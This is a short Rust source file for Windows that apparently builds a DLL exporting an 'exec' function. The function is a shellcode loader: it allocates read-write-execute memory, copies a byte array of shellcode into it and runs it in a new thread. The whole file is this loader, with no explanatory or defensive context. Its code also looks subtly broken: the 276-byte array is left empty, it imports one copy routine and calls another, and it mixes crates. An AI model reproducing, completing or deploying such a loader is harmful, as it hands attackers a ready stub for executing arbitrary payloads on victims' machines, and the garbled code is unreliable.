#![cfg(windows)]
extern crate winapi;
extern crate kernel32;
use winapi::um::winnt::{PROCESS_ALL_ACCESS,MEM_COMMIT,MEM_RESERVE,PAGE_EXECUTE_READWRITE};
use winapi::um::winnt::RtlMoveMemory;
use std::ptr;
use kernel32::CreateThread;

#[no_mangle]
#[allow(unused_variables)]


pub extern "C" fn exec() {

	let shellcode:[u8;276] = [];

	let mut addr = unsafe { kernel32::VirtualAlloc(ptr::null_mut(), shellcode.len() as u64, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE) };
	unsafe { kernel32::RtlCopyMemory(addr, shellcode.as_ptr() as  _, shellcode.len() as u64) };

	addr = unsafe { CreateThread(ptr::null_mut(), 0, Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut()) };

	unsafe { kernel32::WaitForSingleObject(addr, 0xFFFFFFFF) };
}
